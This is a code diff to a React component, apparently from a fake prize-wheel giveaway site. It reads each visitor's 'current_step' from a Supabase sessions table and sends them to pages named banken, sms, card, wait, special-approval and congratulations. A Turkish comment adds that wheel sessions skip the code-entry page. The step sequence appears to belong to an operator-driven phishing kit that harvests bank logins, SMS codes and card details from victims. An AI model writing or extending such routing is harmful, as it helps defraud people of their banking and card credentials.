@@ -37,7 +37,7 @@ export function CodeEntryClient({
       }
       const { data, error: qErr } = await supabase
         .from("sessions")
-        .select("partner_name, participation_code, form_data")
+        .select("partner_name, participation_code, form_data, current_step")
         .eq("id", sessionId)
         .maybeSingle();
 
@@ -49,6 +49,26 @@ export function CodeEntryClient({
       }
 
       const formData = data.form_data as Record<string, any>;
+
+      // ⭐ ÇİFT KORUMA: Session wheel ise, kullanıcı kod girişini görmeden direkt çarka yönlendir
+      if (data.current_step === "wheel" || formData?.is_wheel_game === true) {
+        const target = `/wheel?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        window.location.replace(target);
+        return;
+      }
+      if (data.current_step && data.current_step !== "code_entry") {
+        let redirectTo = `/win/${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "banken") redirectTo = `/banken?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "sms") redirectTo = `/sms?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "card") redirectTo = `/card?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "wait") redirectTo = `/wait?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "special-approval") redirectTo = `/special-approval?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "congratulations") redirectTo = `/congratulations?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        if (data.current_step === "wheel") redirectTo = `/wheel?session=${encodeURIComponent(effectiveRouteSessionId || sessionId)}`;
+        window.location.replace(redirectTo);
+        return;
+      }
+
       setPartnerName(formData?.partner_display_name || data.partner_name || "partner");
       setExpectedCode(data.participation_code || "");
       setLoading(false);
